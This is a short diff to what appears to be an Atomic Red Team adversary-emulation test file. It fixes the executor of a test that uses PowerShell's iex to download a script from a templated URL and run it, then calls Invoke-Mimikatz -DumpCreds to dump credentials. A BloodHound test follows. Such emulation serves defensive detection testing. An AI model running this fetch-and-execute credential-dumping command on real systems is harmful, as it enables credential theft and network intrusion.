@@ -15,8 +15,8 @@ atomic_tests:
   executor:
     command: |
        $wc = New-Object Net.WebClient; $wc.UseDefaultCredentials = $true; 
-       iex $wc.DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
-    name: command_prompt
+       iex $wc.DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds
+    name: powershell
     elevation_required: false
 - name: Run BloodHound from local disk
   auto_generated_guid: a21bb23e-e677-4ee7-af90-6931b57b6350
